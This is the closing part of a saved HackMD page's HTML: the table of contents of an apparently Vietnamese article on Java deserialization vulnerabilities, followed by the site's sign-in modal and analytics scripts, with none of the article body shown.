<li class=""><a href="https://hackmd.io/@nhat015/HktihBmLxl#6-Gadget-chain-l%C3%A0-g%C3%AC" title="6. Gadget chain là gì?" smoothhashscroll="">6. Gadget chain là gì?</a></li>
<li class=""><a href="https://hackmd.io/@nhat015/HktihBmLxl#7-Java-Reflection" title="7. Java Reflection" smoothhashscroll="">7. Java Reflection</a></li>
<li class=""><a href="https://hackmd.io/@nhat015/HktihBmLxl#8-SerializationDumper" title="8. SerializationDumper" smoothhashscroll="">8. SerializationDumper</a></li>
<li class=""><a href="https://hackmd.io/@nhat015/HktihBmLxl#9-Gi%E1%BB%9Bi-thi%E1%BB%87u-v%E1%BB%81-Ysoserial" title="9. Giới thiệu về Ysoserial" smoothhashscroll="">9. Giới thiệu về Ysoserial</a></li>
<li class=""><a href="https://hackmd.io/@nhat015/HktihBmLxl#10-C%C3%B4ng-c%E1%BB%A5-Gadget-Inspector" title="10. Công cụ Gadget Inspector" smoothhashscroll="">10. Công cụ Gadget Inspector</a></li>
<li class=""><a href="https://hackmd.io/@nhat015/HktihBmLxl#11-C%C3%A1ch-ng%C4%83n-ch%E1%BA%B7n-Java-Deserialization-vulnerability" title="11. Cách ngăn chặn Java Deserialization vulnerability" smoothhashscroll="">11. Cách ngăn chặn Java Deserialization vulnerability</a></li>
</ul>
</li>
<li class="active"><a href="https://hackmd.io/@nhat015/HktihBmLxl#II-D%E1%BB%B0NG-M%C3%94I-TR%C6%AF%E1%BB%9CNG-TEST" title="II. DỰNG MÔI TRƯỜNG TEST" smoothhashscroll="">II. DỰNG MÔI TRƯỜNG TEST</a></li>
</ul>
</li>
</ul>
</div><div class="toc-menu"><a class="expand-toggle" href="https://hackmd.io/@nhat015/HktihBmLxl#">Expand all</a><a class="back-to-top" href="https://hackmd.io/@nhat015/HktihBmLxl#">Back to top</a><a class="go-to-bottom" href="https://hackmd.io/@nhat015/HktihBmLxl#">Go to bottom</a></div></ul></div></div><div class="toc-placeholder hidden"></div><div id="ui-toc-affix" class="ui-affix-toc ui-toc-dropdown unselectable hidden-print affix" data-spy="affix" lang="vi-VN" style="max-width: min(386.4px, 15vw); top: 163px; right: 1139.4px;" dir="ltr"><div class="toc"><ul class="nav">
<li class="active"><a href="https://hackmd.io/@nhat015/HktihBmLxl#Nh%E1%BB%AFng-%C4%91i%E1%BB%83u-v%E1%BB%81-l%E1%BB%97-h%E1%BB%95ng-Java-Deserialization-vulnerability" title="Những điểu về lỗ hổng Java Deserialization vulnerability" smoothhashscroll="">Những điểu về lỗ hổng Java Deserialization vulnerability</a><ul class="nav">
<li class=""><a href="https://hackmd.io/@nhat015/HktihBmLxl#M%E1%BB%A5c-l%E1%BB%A5c" title="Mục lục" smoothhashscroll="">Mục lục</a></li>
<li class=""><a href="https://hackmd.io/@nhat015/HktihBmLxl#I-L%C3%9D-THUY%E1%BA%BET" title="I. LÝ THUYẾT" smoothhashscroll="">I. LÝ THUYẾT</a><ul class="nav">
<li class=""><a href="https://hackmd.io/@nhat015/HktihBmLxl#1-M%E1%BB%99t-s%E1%BB%91-kh%C3%A1i-ni%E1%BB%87m-c%C6%A1-b%E1%BA%A3n" title="1. Một số khái niệm cơ bản" smoothhashscroll="">1. Một số khái niệm cơ bản</a></li>
<li class=""><a href="https://hackmd.io/@nhat015/HktihBmLxl#2-Ki%E1%BA%BFn-th%E1%BB%A9c-n%E1%BB%81n" title="2. Kiến thức nền" smoothhashscroll="">2. Kiến thức nền</a></li>
<li class=""><a href="https://hackmd.io/@nhat015/HktihBmLxl#3-Insecure-Deserialization-l%C3%A0-g%C3%AC" title="3. Insecure Deserialization là gì" smoothhashscroll="">3. Insecure Deserialization là gì</a></li>
<li class=""><a href="https://hackmd.io/@nhat015/HktihBmLxl#4-L%C3%BD-do-l%E1%BB%97-h%E1%BB%95ng-Insecure-Deserialization-ph%C3%A1t-sinh" title="4. Lý do lỗ hổng Insecure Deserialization phát sinh?" smoothhashscroll="">4. Lý do lỗ hổng Insecure Deserialization phát sinh?</a></li>
<li class=""><a href="https://hackmd.io/@nhat015/HktihBmLxl#5-H%E1%BA%ADu-qu%E1%BA%A3-c%E1%BB%A7a-Insecure-Deserialization" title="5. Hậu quả của Insecure Deserialization" smoothhashscroll="">5. Hậu quả của Insecure Deserialization</a></li>
<li class=""><a href="https://hackmd.io/@nhat015/HktihBmLxl#6-Gadget-chain-l%C3%A0-g%C3%AC" title="6. Gadget chain là gì?" smoothhashscroll="">6. Gadget chain là gì?</a></li>
<li class=""><a href="https://hackmd.io/@nhat015/HktihBmLxl#7-Java-Reflection" title="7. Java Reflection" smoothhashscroll="">7. Java Reflection</a></li>
<li class=""><a href="https://hackmd.io/@nhat015/HktihBmLxl#8-SerializationDumper" title="8. SerializationDumper" smoothhashscroll="">8. SerializationDumper</a></li>
<li class=""><a href="https://hackmd.io/@nhat015/HktihBmLxl#9-Gi%E1%BB%9Bi-thi%E1%BB%87u-v%E1%BB%81-Ysoserial" title="9. Giới thiệu về Ysoserial" smoothhashscroll="">9. Giới thiệu về Ysoserial</a></li>
<li class=""><a href="https://hackmd.io/@nhat015/HktihBmLxl#10-C%C3%B4ng-c%E1%BB%A5-Gadget-Inspector" title="10. Công cụ Gadget Inspector" smoothhashscroll="">10. Công cụ Gadget Inspector</a></li>
<li class=""><a href="https://hackmd.io/@nhat015/HktihBmLxl#11-C%C3%A1ch-ng%C4%83n-ch%E1%BA%B7n-Java-Deserialization-vulnerability" title="11. Cách ngăn chặn Java Deserialization vulnerability" smoothhashscroll="">11. Cách ngăn chặn Java Deserialization vulnerability</a></li>
</ul>
</li>
<li class="active"><a href="https://hackmd.io/@nhat015/HktihBmLxl#II-D%E1%BB%B0NG-M%C3%94I-TR%C6%AF%E1%BB%9CNG-TEST" title="II. DỰNG MÔI TRƯỜNG TEST" smoothhashscroll="">II. DỰNG MÔI TRƯỜNG TEST</a></li>
</ul>
</li>
</ul>
</div><div class="toc-menu"><a class="expand-toggle" href="https://hackmd.io/@nhat015/HktihBmLxl#">Expand all</a><a class="back-to-top" href="https://hackmd.io/@nhat015/HktihBmLxl#">Back to top</a><a class="go-to-bottom" href="https://hackmd.io/@nhat015/HktihBmLxl#">Go to bottom</a></div></div><div class="clearfix"></div><div id="floating-toolbar" class="relative md:fixed" style="display: none;"><div><a class="pointer-events-none fixed hidden" type="button" aria-haspopup="dialog" aria-expanded="true" aria-controls="radix-1" data-state="open"></a></div></div></div>
    <!-- signin modal -->

<div class="modal fade signin-modal" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel" aria-hidden="true" theme="light">
    <div class="modal-dialog">
        <div class="modal-content">
            <button type="button" class="close" data-dismiss="modal" aria-label="Close" style="margin-top: 10px; right: 20px; position: absolute;"><span aria-hidden="true">×</span></button>
            






    









<h3>Sign in</h3>

<form data-toggle="validator" role="form" class="form-horizontal" method="post" enctype="application/x-www-form-urlencoded" id="signin-form" novalidate="true">
    <div class="hmd-dn"><input type="hidden" name="_csrf" value="RVqIdnor-gB6Tkxc8oEiiQxpxKJQcNQRWf14"></div>
    <div class="hmd-dn"><input type="hidden" name="create_team" value="false"></div>
    <div class="hmd-dn"><input type="hidden" name="create_paid_team" value="false"></div>
    
    <div class="form-group  ">
        <label for="email" class="control-label">Email</label>
        <label for="inputEmail" class="control-label pull-right errors">
            
        </label>
        <span class="help-block control-label with-errors pull-right" style="margin-top: 14px"></span>
        <div class="input-block">
            
                <input type="email" class="form-control" name="email" placeholder="Your email" required="" autocomplete="email">
            
            <span class="error-sign"></span>
        </div>
    </div>
    <div class="form-group ">
        <label for="password" class="control-label">Password</label>
        <label for="inputPassword" class="control-label pull-right errors">
            
        </label>
        <span class="help-block control-label with-errors pull-right" style="margin-top: 14px"></span>
        <div class="input-block">
            <input type="password" class="form-control" name="password" placeholder="Your password" required="" autocomplete="current-password" maxlength="128">
            <span class="error-sign"></span>
            
                <span class="control-label pull-right !text-normal !leading-normal !font-normal !mt-1.5"><a href="https://hackmd.io/settings/forgotPassword" style="text-decoration: underline;">Forgot password</a></span>
            
        </div>
    </div>

    <div style="text-align: center; padding-top: 15px; margin-bottom: 0px;">
        <div hidden="" id="hmd-captcha" data-provider="" data-captcha-data="" class="flex justify-center"></div>

        
            <input type="submit" class="neo-btn neo-btn-primary !justify-center !py-3.5 !mx-auto w-[180px] text-[18px] disabled" formaction="https://hackmd.io/login" value="Sign in">
        

        
    </div>
</form>














    
        <p class="separator">or</p>
    

    
        <p>By clicking below, you agree to our <a href="https://hackmd.io/s/terms" target="_blank">terms of service</a>.</p>
    

    












<script id="gsi-client" src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/client" async="" defer="" nonce=""></script>
<script nonce="">
    function handleCredentialResponse(response) {
        const form = document.getElementById('sign-in-with-google-form')
        form.children.credential.value = response.credential
        form.children.method.value = location.href.toLowerCase() === 'https://hackmd.io/settings#general' ? 'merge' : 'login'
        form.submit()
    }
    var GSI_READY = new Promise(function (resolve) {
        function initialize () {
            google.accounts.id.initialize({
                client_id: '911617723593-drikdibvvn63slfd6kbqigo8ql1no55s.apps.googleusercontent.com',
                callback: handleCredentialResponse
            })
            const loginPath = '/login'
            const joinPath = '/join'
            const renderButton = function () {
                google.accounts.id.renderButton(
                    document.getElementById('sign-in-with-google-button'),
                    { type: 'standard', width: 250 }
                )
            }
            if (location.pathname.toLowerCase() === loginPath || location.pathname.toLowerCase() === joinPath) {
                renderButton()
            } else {
                $('.signin-modal').one('shown.bs.modal', function () {
                    renderButton()
                })
            }
            resolve()
        }

        window.addEventListener('load', function () { initialize() })
    })
</script>
<form class="hidden" id="sign-in-with-google-form" action="https://hackmd.io/auth/google" method="post">
    <input type="hidden" name="credential">
    <input type="hidden" name="method">
    <input type="hidden" name="_csrf" value="RVqIdnor-gB6Tkxc8oEiiQxpxKJQcNQRWf14">
</form>


<div class="oauth-sign-container">
    
    <div id="sign-in-with-google-button"></div>
    
    
    <a href="https://hackmd.io/auth/facebook" class="btn btn-lg btn-block btn-social btn-facebook">
        <i class="fa fa-facebook"></i> Sign in via Facebook
    </a>
    
    
    <a href="https://hackmd.io/auth/twitter" class="btn btn-lg btn-block btn-social btn-twitter">
        <i class="fa fa-twitter"></i> Sign in via Twitter
    </a>
    
    
    <a href="https://hackmd.io/auth/github" class="btn btn-lg btn-block btn-social btn-github">
        <i class="fa fa-github"></i> Sign in via GitHub
    </a>
    
    
    <a href="https://hackmd.io/auth/dropbox" class="btn btn-lg btn-block btn-social btn-dropbox">
        <i class="fa fa-dropbox"></i> Sign in via Dropbox
    </a>
    
    
    
      <a href="https://hackmd.io/@nhat015/HktihBmLxl#" class="btn btn-block btn-social btn-web3 bg-gray-800 hocus:bg-[#2b2b2b] text-white hocus:text-white">
          <img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/wallet.svg" style="max-height: 20px; margin-top: 8px; margin-left: 6px; border: none;">
          <span class="sign-in-wallet-text">
              Sign in with Wallet
          </span>

          <div class="inline-flex items-center justify-between w-full hidden web3-wallet-info">
              <span>
                   Wallet
                   (
                    <span class="web3-wallet-address"></span>
                   )
              </span>

              <i class="fa fa-arrow-right" aria-hidden="true"></i>
          </div>
      </a>

      <small class="web3-wallet-info hidden text-left hocus:text-white underline hocus:underline block pt-2 ui-disconnect-connected-wallets text-gray-600 cursor-pointer">
          Connect another wallet
      </small>
    
</div>




    <div>
        <p>New to HackMD? <a href="https://hackmd.io/join" class="plausible-event-name=LoginModalSignUp">Sign up</a></p>
    </div>




        </div>
    </div>
</div>

    
    <script type="text/javascript" crossorigin="anonymous" src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/surveys.js.tải xuống"></script><script type="text/javascript" crossorigin="anonymous" src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/config.js.tải xuống"></script><script type="text/javascript" crossorigin="anonymous" src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/web-vitals.js.tải xuống"></script><script type="text/javascript" crossorigin="anonymous" src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/dead-clicks-autocapture.js.tải xuống"></script><script src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/js"></script>
    <script nonce="">
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        let userid = (document.cookie.match('(^|; )userid=([^;]*)')||0)[2];
        gtag('config', 'G-NGVZMM6DR6', {'user_id': userid});
        
    </script>


    
<script src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/bundle.min.js.tải xuống" crossorigin="anonymous"></script>
<script nonce="">
  Sentry.init({ dsn: 'https://73410f1915d84abc8b2dd1f1aabd1c82@sentry.hackmd.dev/4', environment: 'production', integrations: function (intrus) { return intrus.filter(function (itr) { return itr.name !== 'TryCatch' }) } });
  const sentryUserId = document.cookie
    .split('; ')
    .map(cookie => cookie.split('='))
    .reduce((acc, [k, v]) => k === 'userid' ? v : acc, '');
  Sentry.setUser(sentryUserId ? { id: sentryUserId } : null);
</script>


    
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KLW9Z3"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->



    <script src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/i18n.js.tải xuống"></script>
     <script src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/font-vendor.7631cb852a460f17d568.js.tải xuống" defer="defer"></script><script src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/common-vendor.3c9a3da9f8a49f6ad878.js.tải xuống" defer="defer"></script><script src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/pretty-vendor.1e65e4faa04a7ebdd05b.js.tải xuống" defer="defer"></script><script src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/pretty-common.fb61aa6b71cf8200ffc1.js.tải xuống" defer="defer"></script><script src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/pretty.77490b5af5822e4a575f.js.tải xuống" defer="defer"></script>

    



<script id="" text="" charset="" type="text/javascript" src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/script.manual.js.tải xuống" nonce=""></script><div class="ReactModalPortal"></div><div data-radix-popper-content-wrapper="" style="position: fixed; left: 0px; top: 0px; transform: translate(0px, 8px); min-width: max-content; z-index: 1001; --radix-popper-available-width: 1520.800048828125px; --radix-popper-available-height: 687.2000122070312px; --radix-popper-anchor-width: 0px; --radix-popper-anchor-height: 0px; --radix-popper-transform-origin: 0% 0px;"><div data-side="bottom" data-align="start" data-state="open" role="dialog" id="radix-1" class="z-[1001] rounded-lg border border-solid border-border-default select-none bg-background-default shadow-[0_3px_15px_0_#00000026] hidden" tabindex="-1" style="--radix-popover-content-transform-origin: var(--radix-popper-transform-origin); --radix-popover-content-available-width: var(--radix-popper-available-width); --radix-popover-content-available-height: var(--radix-popper-available-height); --radix-popover-trigger-width: var(--radix-popper-anchor-width); --radix-popover-trigger-height: var(--radix-popper-anchor-height);"><div class="ui-floating-toolbar-popover flex flex-row p-[7px]"><button class="rounded text-normal font-normal leading-normal flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled ui-selection-popover-comment ui-floating-toolbar-comment gap-1 p-[7px]" data-state="closed"><i class="inline-flex ph ph-chat-circle-dots" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i>Comment</button><button class="rounded text-normal font-normal leading-normal flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled ui-selection-popover-suggest-edit ui-floating-toolbar-suggest-edit p-[7px]" data-state="closed"><i class="inline-flex ph ph-pencil-simple-line" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><span class="ml-1 flex border-0 border-l border-solid border-background-subtle pr-1"></span><button class="rounded text-normal font-normal leading-normal flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled ui-floating-toolbar-copy-link p-[7px]" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-normal font-normal leading-normal flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled ui-floating-toolbar-paragraph-bookmark p-[7px]" data-state="closed"><span class="inline-flex ph" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"><svg width="100%" height="100%" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M9.58579 4.58579C9.96086 4.21071 10.4696 4 11 4H25C25.5304 4 26.0391 4.21071 26.4142 4.58579C26.7893 4.96086 27 5.46957 27 6V28C27 28.3635 26.8027 28.6984 26.4848 28.8746C26.1668 29.0509 25.7783 29.0407 25.47 28.848L18 24.1792L10.53 28.848C10.2217 29.0407 9.83319 29.0509 9.51523 28.8746C9.19728 28.6984 9 28.3635 9 28V6C9 5.46957 9.21071 4.96086 9.58579 4.58579ZM25 6H11L11 26.1958L17.47 22.152C17.7943 21.9493 18.2057 21.9493 18.53 22.152L25 26.1958V6Z" fill="currentColor"></path><path d="M5 5C5 4.44772 5.44772 4 6 4C6.55228 4 7 4.44772 7 5V28C7 28.5523 6.55228 29 6 29C5.44772 29 5 28.5523 5 28V5Z" fill="currentColor"></path></svg></span></button><span class="ml-1 flex border-0 border-l border-solid border-background-subtle pr-1"></span><button class="p-0 m-0 bg-transparent border-none text-5 leading-[20px]" type="button" aria-haspopup="dialog" aria-expanded="false" aria-controls="radix-0" data-state="closed"><span class="rounded text-normal font-normal leading-normal flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled ui-floating-toolbar-emoji-reply p-[7px]" role="button" data-state="closed"><i class="inline-flex ph ph-smiley" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></span></button></div></div></div><div class="ReactModalPortal"></div><span data-radix-focus-guard="" tabindex="0" style="outline: none; opacity: 0; position: fixed; pointer-events: none;"></span><div class="ReactModalPortal"></div><div class="ReactModalPortal"></div><div class="ReactModalPortal"></div><div class="ReactModalPortal"></div><div id="toasts-container-top" class="toasts-container-top"><div><div class="pointer-events-auto ml-auto mr-auto flex w-fit flex-col justify-end"></div></div><div><div class="pointer-events-auto ml-auto mr-auto flex w-fit flex-col justify-end"></div></div></div><div><div class="fixed left-0 top-0 z-[1998] h-[100dvh] w-[100dvw] transition-opacity duration-300 bg-[#000]/80 pointer-events-none opacity-0" theme="dark"></div></div><div class="ReactModalPortal"></div>
<script id="" text="" charset="" type="text/javascript" src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/tracks.js.tải xuống" nonce=""></script>
</body><div><div class="react-joyride"></div></div><div></div></html>